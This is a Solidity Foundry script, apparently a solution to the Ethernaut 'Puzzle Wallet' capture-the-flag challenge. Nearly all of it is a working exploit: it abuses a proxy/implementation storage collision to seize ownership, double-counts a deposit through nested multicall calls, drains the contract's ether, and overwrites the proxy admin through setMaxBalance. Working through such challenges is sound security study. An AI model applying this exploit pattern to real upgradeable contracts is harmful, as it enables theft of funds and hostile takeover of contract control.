// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface IPuzzleProxy {
    function pendingAdmin() external view returns(address);
    function admin() external view returns(address);

    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
}


interface IPuzzleWallet {
    function owner() external view returns(address);
    function maxBalance() external view returns(uint256);
    function whitelisted(address) external view returns(bool);
    function balances(address) external view returns(uint256);

    function setMaxBalance(uint256 _maxBalance) external;
    function execute(address to, uint256 value,bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}


contract Solver is Script {
    address puzzle_wallet = vm.envAddress("PUZZLEWALLET_INSTANCE");
    address my_eoa_wallet = vm.envAddress("MY_EOA_WALLET");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        IPuzzleProxy(puzzle_wallet).proposeNewAdmin(my_eoa_wallet);
        require(IPuzzleWallet(puzzle_wallet).owner() == my_eoa_wallet, "Failed: owner is not equal to MY_EOA_WALLET");

        IPuzzleProxy(puzzle_wallet).addToWhitelist(my_eoa_wallet);
        require(IPuzzleWallet(puzzle_wallet).whitelisted(my_eoa_wallet) == true, "Failed: MY_EOA_WALLET is not a whitelisted");

        /********************************************************************************************************************************/

        // Constructing multicall's data : `data`
        // data = [first_sub_multicall_data, second_sub_multicall_data]
        bytes[] memory data = new bytes[](2);

        // multicall(data=[first_sub_multicall_data, second_sub_multicall_data])
        //                 |_ deposit()
        bytes memory first_sub_multicall_data = abi.encodeWithSignature("deposit()");

        // multicall(data=[first_sub_multicall_data, second_sub_multicall_data])
        //                 |_ deposit()
        //                                           |_ multicall(data=deposit())
        bytes[] memory calldata_for_second_sub_multicall = new bytes[](1);
        calldata_for_second_sub_multicall[0] = abi.encodeWithSignature("deposit()");
        bytes memory second_sub_multicall_data = abi.encodeWithSignature("multicall(bytes[])", calldata_for_second_sub_multicall);
        
        data[0] = first_sub_multicall_data;
        data[1] = second_sub_multicall_data;

        /********************************************************************************************************************************/

        IPuzzleWallet(puzzle_wallet).multicall{value: 0.001 ether}(data); // don't forget 0.001 ETH as the msg.value!
        require(IPuzzleWallet(puzzle_wallet).balances(my_eoa_wallet) == 0.002 ether, "Failed: delegatecall exploit failed!");

        // Withdraw ethers to make puzzle_wallet.balance == 0!
        IPuzzleWallet(puzzle_wallet).execute(my_eoa_wallet, 0.002 ether, "");
        require(puzzle_wallet.balance == 0, "Failed: puzzle_wallet.balance is not equal to 0");

        // Set PuzzleWallet.maxBalance to overwrite PuzzleProxy.admin
        IPuzzleWallet(puzzle_wallet).setMaxBalance(uint256(uint160(my_eoa_wallet)));
        require(IPuzzleProxy(puzzle_wallet).admin() == my_eoa_wallet, "Failed: PuzzleProxy.admin is not equal to MY_EOA_WALLET");

        vm.stopBroadcast();
    }
}
